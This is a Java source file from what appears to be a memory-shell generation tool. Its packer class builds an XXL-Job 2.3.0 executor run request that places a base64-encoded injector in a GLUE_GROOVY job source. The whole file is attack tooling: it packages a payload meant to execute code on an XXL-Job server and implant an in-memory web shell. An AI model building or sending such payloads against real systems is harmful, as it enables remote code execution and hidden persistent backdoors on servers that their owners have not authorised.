package com.reajason.javaweb.memshell.packer;

import com.alibaba.fastjson2.JSONObject;
import com.alibaba.fastjson2.JSONWriter;
import com.reajason.javaweb.memshell.config.GenerateResult;
import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2025/1/21
 */
public class XxlJob230Packer implements Packer {
    String template = "";

    public XxlJob230Packer() {
        try {
            template = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/XXL-Job-DefineClass-230.java")), Charset.defaultCharset());
        } catch (IOException ignored) {

        }
    }

    @Override
    public String pack(GenerateResult generateResult) {
        String source = template
                .replace("{{base64Str}}", generateResult.getInjectorBytesBase64Str())
                .replace("{{className}}", generateResult.getInjectorClassName());
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("jobId", 1);
        jsonObject.put("executorHandler", "demoJobHandler");
        jsonObject.put("executorParams", "demoJobHandler");
        jsonObject.put("executorBlockStrategy", "COVER_EARLY");
        jsonObject.put("executorTimeout", 0);
        jsonObject.put("logId", 1);
        jsonObject.put("logDateTime", System.currentTimeMillis());
        jsonObject.put("glueType", "GLUE_GROOVY");
        jsonObject.put("glueSource", source);
        jsonObject.put("glueUpdatetime", System.currentTimeMillis());
        jsonObject.put("broadcastIndex", 0);
        jsonObject.put("broadcastTotal", 0);
        return JSONObject.toJSONString(jsonObject, JSONWriter.Feature.PrettyFormat);
    }
}